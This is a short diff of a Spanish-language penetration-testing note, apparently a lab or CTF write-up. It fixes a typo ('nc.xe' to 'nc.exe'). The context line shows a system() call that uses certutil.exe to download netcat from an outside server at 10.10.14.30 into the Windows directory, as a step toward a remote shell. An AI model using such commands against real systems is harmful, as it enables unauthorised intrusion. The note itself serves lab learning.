@@ -342,5 +342,6 @@ system("certutil.exe -f -urlcache -split http://10.10.14.30/nc.exe C:\\Windows\\
 ![[Pasted image 20240520172934.png]]
 
 `server`
-vemos las peticiones en nuestro servidor lo que nos indica que se acaba de descargar el nc.xe
+vemos las peticiones en nuestro servidor lo que nos indica que se acaba de descargar el nc.exe
 ![[Pasted image 20240520173318.png]]
+
